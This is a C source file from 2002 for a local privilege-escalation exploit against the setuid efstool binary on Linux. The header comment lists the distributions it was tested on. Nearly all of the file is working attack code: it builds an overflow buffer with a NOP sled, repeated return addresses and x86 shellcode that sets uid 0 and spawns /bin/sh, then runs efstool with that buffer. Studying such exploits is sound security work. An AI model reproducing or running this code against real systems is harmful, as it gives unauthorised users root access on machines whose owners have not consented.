/*  efs_local.c  - efstool local stack-based exploit
 *  
 *  Simple buffer overflow bug in efstool under linux, will
 *  spawn a user shell and a root shell if efstool binary
 *  is setuid (chmod 4755) and owned by root.
 *
 *  -  Gentoo Linux 1.4-rc1 (tested and works)
 *  -  RedHat Linux 8.0 (tested and works)
 *  -  RedHat Linux 7.3 (not tested)
 *  -  RedHat Linux 7.2 (not tested)
 *  -  Slackware Linux 8.1 (tested and works)
 *  -  Slackware Linux 8.0 (tested and works, but change path)
 * 
 *  The list is getting long, think most of the major linux
 *  and/or *BSD's are affected. If you want to try out this
 *  on *BSD you have to replace the shellcode.
 *
 *
 *  Created: 2002-12-29 by N.Kursu (kursu at linux dot se)
 *  Release: v0.8
 *
 *  * Use this on your own risk and dont blame me if  *
 *  * your life gets messed up!                       *
 *  
 *  Greetings to kozmic, for giveing me a shell on his "hack me"
 *  RedHat Linux 8.0 box and testing out Gentoo 1.4rc1.
 */


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define NOP         0x90
#define BSIZE       3000
#define ERROR       -1
#define PPATH       "/usr/bin/efstool"

char shellcode[] = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76"
                   "\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3"
	           "\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40"
		   "\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_esp(void) {
   __asm__("movl %esp, %eax");
}

void usage(char *cmd) {
   fprintf(stderr, "\n* Efstool local (user/root) exploit by kursu *\n");
   fprintf(stderr, "==============================================\n");
   fprintf(stderr, "An offset around 2000 should work, it did for\n");
   fprintf(stderr, "me under Slackware Linux 8.1.\n");
   fprintf(stderr, "\n\nUsage: %s <offset>\n\n", cmd);
   exit(ERROR);
}

int main(int argc, char *argv[]) {
   int i, off, nop = NOP;
   long esp, ret, *ret_ptr;
   char *buffer, *buffer_ptr;

   if(argc<2) { usage(argv[0]); }

   off = atoi(argv[1]);
   esp = get_esp();
   ret = esp-off;

   if(!(buffer = (char *)malloc(BSIZE))) {
      fprintf(stderr, "\nCant allocate memory!\n");
      exit(ERROR);
   }

   buffer_ptr = buffer;
   ret_ptr = (long *)buffer_ptr;

   for(i = 0; i < BSIZE; i+=4) {
      *(ret_ptr++) = ret;
   }

   for(i = 0; i < BSIZE/2; i++) {
      buffer[i] = nop;
   }

   buffer_ptr = buffer + ((BSIZE/2) - (strlen(shellcode)/2));

   for(i = 0; i < strlen(shellcode); i++) {
      *(buffer_ptr++) = shellcode[i];
   }


   buffer[BSIZE-1] = '\0';
   execl(PPATH, "efstool", buffer, 0);

   return 0;
   
}
